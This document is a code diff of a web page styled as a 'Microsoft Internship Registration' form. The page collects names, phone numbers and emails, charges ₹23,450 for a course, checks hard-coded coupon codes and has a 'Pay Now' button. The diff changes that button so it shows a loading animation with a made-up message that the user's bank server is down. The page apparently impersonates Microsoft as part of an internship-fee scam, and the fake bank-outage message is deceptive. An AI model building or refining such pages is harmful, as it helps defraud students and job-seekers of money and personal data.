@@ -126,28 +126,55 @@
       font-size: 13px;
       color: #444;
     }
-
-    /* CHANGES START */
-    #loadingScreen {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      background-color: #f3f4f6;
-      z-index: 9999;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
+    a.pay-now {
+      display: block;
+      margin-top: 25px;
+      text-align: center;
+      background-color: #0078d4;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 6px;
+      padding: 12px;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    a.pay-now:hover {
+      background-color: #005a9e;
     }
 
-    .spinner {
-      width: 48px;
-      height: 48px;
-      border: 5px solid #0078d4;
-      border-bottom-color: transparent;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 25px 15px;
+      }
+    }
+
+    /* Fullscreen loader overlay */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: #f0f8ff;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .loader {
+      border: 6px solid #cce6ff;
+      border-top: 6px solid #0078d4;
       border-radius: 50%;
+      width: 60px;
+      height: 60px;
       animation: spin 1s linear infinite;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
     }
 
     @keyframes spin {
@@ -155,28 +182,22 @@
       100% { transform: rotate(360deg); }
     }
 
-    .loading-text {
-      color: #0078d4;
+    .type-text {
+      font-size: 20px;
       font-weight: 600;
-      font-size: 18px;
+      color: #0078d4;
+      height: 30px;
       white-space: nowrap;
       overflow: hidden;
-      border-right: 2px solid #0078d4;
-      width: 0;
-      animation: typing 2.5s steps(40, end) infinite, blink 0.75s step-end infinite;
-    }
-
-    @keyframes typing {
-      0% { width: 0 }
-      40%, 60% { width: 100% }
-      80%, 100% { width: 0 }
+      border-right: 3px solid #0078d4;
+      animation: blink 0.7s step-end infinite;
     }
 
     @keyframes blink {
-      0%, 100% { border-color: transparent }
-      50% { border-color: #0078d4 }
+      50% {
+        border-color: transparent;
+      }
     }
-    /* CHANGES END */
   </style>
 </head>
 <body>
@@ -185,21 +206,81 @@
       <h2>Microsoft Internship Registration</h2>
       <div class="note">Get Certified Internship + Placement Opportunity | Duration: <strong>6 Months</strong></div>
       <form id="internshipForm" onsubmit="return false;">
-        <!-- Form Fields Here (unchanged) -->
+        <label for="name">Full Name</label>
+        <input type="text" name="name" required />
 
-        <!-- ... all previous fields ... -->
+        <label for="contact">Contact Number</label>
+        <input type="text" name="contact" required />
 
-        <a href="#" class="pay-now" onclick="startLoading()">Pay Now</a>
+        <label for="email">Email Address</label>
+        <input type="email" name="email" required />
+
+        <label for="startDate">Select Start Date</label>
+        <select name="startDate" required>
+          <option value="">-- Select Date --</option>
+          <option value="01/Sept/2025">01/Sept/2025</option>
+          <option value="15/Sept/2025">15/Sept/2025</option>
+          <option value="01/Oct/2025">01/Oct/2025</option>
+        </select>
+
+        <label for="timing">Preferred Timings</label>
+        <select name="timing" required>
+          <option value="">-- Select Timing --</option>
+          <option value="7AM - 9AM">7AM - 9AM</option>
+          <option value="6PM - 8PM">6PM - 8PM</option>
+          <option value="8PM - 10PM">8PM - 10PM</option>
+        </select>
+
+        <label for="course">Select Course - ₹23,450</label>
+        <select name="course" id="course" required>
+          <option value="">-- Select Course --</option>
+          <option value="Data Science with Python">Data Science with Python</option>
+          <option value="App Development">App Development</option>
+          <option value="Web Development">Web Development</option>
+          <option value="Machine Learning">Machine Learning</option>
+          <option value="Artificial Intelligence">Artificial Intelligence</option>
+          <option value="Cloud Computing">Cloud Computing</option>
+          <option value="Cyber Security">Cyber Security</option>
+          <option value="Blockchain Basics">Blockchain Basics</option>
+          <option value="DevOps Fundamentals">DevOps Fundamentals</option>
+          <option value="UI/UX Design">UI/UX Design</option>
+          <option value="Mobile App Development">Mobile App Development</option>
+          <option value="Internet of Things (IoT)">Internet of Things (IoT)</option>
+          <option value="Full Stack Development">Full Stack Development</option>
+          <option value="Digital Marketing">Digital Marketing</option>
+          <option value="Power BI">Power BI</option>
+          <option value="Python Programming">Python Programming</option>
+        </select>
+
+        <div class="coupon-section">
+          <label for="coupon">Enter Coupon Code</label>
+          <div class="coupon-wrapper">
+            <input type="text" id="coupon" placeholder="Enter your code" />
+            <button type="button" onclick="applyCoupon()">Apply</button>
+          </div>
+          <div class="coupon-error" id="couponError">Invalid Coupon Code!</div>
+        </div>
+
+        <div class="summary" id="priceSummary">
+          <div class="line"><span>Original Price:</span><span><s>₹23,450</s></span></div>
+          <div class="line"><span>Student Coupon Applied:</span><span id="discountText">No</span></div>
+          <div class="line"><span>Discount %:</span><span id="discountPercent">0%</span></div>
+          <div class="line total"><span>Total to Pay:</span><span id="finalPrice">₹23,450</span></div>
+        </div>
+
+        <div class="invoice-toggle" id="toggleInvoice" onclick="toggleInvoice()">View Invoice Details</div>
+        <div class="invoice" id="invoiceDetails"></div>
+
+        <a class="pay-now" onclick="startLoading()">Pay Now</a>
       </form>
     </div>
   </div>
 
-  <!-- CHANGES START -->
-  <div id="loadingScreen" class="form-wrapper">
-    <div class="spinner"></div>
-    <div class="loading-text" id="dynamicText"></div>
+  <!-- Fullscreen Loader -->
+  <div class="overlay" id="loadingOverlay" style="display:none;">
+    <div class="loader"></div>
+    <div class="type-text" id="typedText"></div>
   </div>
-  <!-- CHANGES END -->
 
   <script>
     const validCoupons = ["AA349BN6593MST", "TL934BZMST4502", "kandamas"];
@@ -259,29 +340,38 @@
       }
     }
 
-    // CHANGES START
     function startLoading() {
-      document.getElementById("loadingScreen").style.display = "flex";
-      cycleMessages();
+      document.getElementById("loadingOverlay").style.display = "flex";
+      typeLoop();
     }
 
     const messages = [
       "It is processing...",
-      "Unfortunately your Bank Server is Down..."
+      "Unfortunately, your Bank Server is Down..."
     ];
     let msgIndex = 0;
+    let charIndex = 0;
+    let isDeleting = false;
 
-    function cycleMessages() {
-      const textElement = document.getElementById("dynamicText");
-      setInterval(() => {
-        textElement.style.animation = 'none'; // Reset typing
-        void textElement.offsetWidth; // Force reflow
-        textElement.innerText = messages[msgIndex];
-        textElement.style.animation = null;
-        msgIndex = (msgIndex + 1) % messages.length;
-      }, 5000);
+    function typeLoop() {
+      const textEl = document.getElementById("typedText");
+      const current = messages[msgIndex];
+      let displayText = current.substring(0, charIndex);
+
+      textEl.innerText = displayText;
+
+      if (!isDeleting && charIndex < current.length) {
+        charIndex++;
+        setTimeout(typeLoop, 80);
+      } else if (isDeleting && charIndex > 0) {
+        charIndex--;
+        setTimeout(typeLoop, 50);
+      } else {
+        isDeleting = !isDeleting;
+        if (!isDeleting) msgIndex = (msgIndex + 1) % messages.length;
+        setTimeout(typeLoop, 800);
+      }
     }
-    // CHANGES END
   </script>
 </body>
 </html>
